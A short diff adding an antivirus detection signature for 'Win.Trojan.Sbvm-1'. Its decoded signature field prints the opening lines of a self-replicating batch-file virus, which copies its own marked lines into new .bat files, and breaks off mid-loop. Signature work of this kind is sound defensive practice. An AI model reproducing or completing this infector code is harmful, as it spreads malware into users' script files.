@@ -1,0 +1,11 @@
+VIRUS NAME: Win.Trojan.Sbvm-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+
+
+@echo off %DkpRJ%
+if -%1==-@ goto DkpRJz
+echo.>DkpRJ.bat
+find "DkpRJ"<%0>>DkpRJ.bat
+for %%b in (*.bat
